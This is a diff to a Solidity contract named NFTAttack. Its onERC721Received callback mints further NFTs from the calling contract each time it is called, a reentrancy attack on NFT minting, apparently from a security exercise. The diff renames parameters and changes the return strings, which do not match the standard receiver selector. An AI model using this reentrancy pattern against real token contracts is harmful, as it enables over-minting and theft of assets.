@@ -37,18 +37,18 @@ contract NFTAttack is IERC721Receiver {
     }
 
     function onERC721Received(
-        address operator,
-        address from,
-        uint256 tokenId,
-        bytes calldata data
+        address,
+        address,
+        uint256,
+        bytes calldata
     ) external returns (bytes4) {
         if (currentValue == 0) {
-            return "0";
+            return "0x00";
         }
         currentValue--;
         if (currentValue > 0) {
             myNFT(msg.sender).mintNFT(currentValue);
-            return "1";
         }
+        return "0x01";
     }
 }
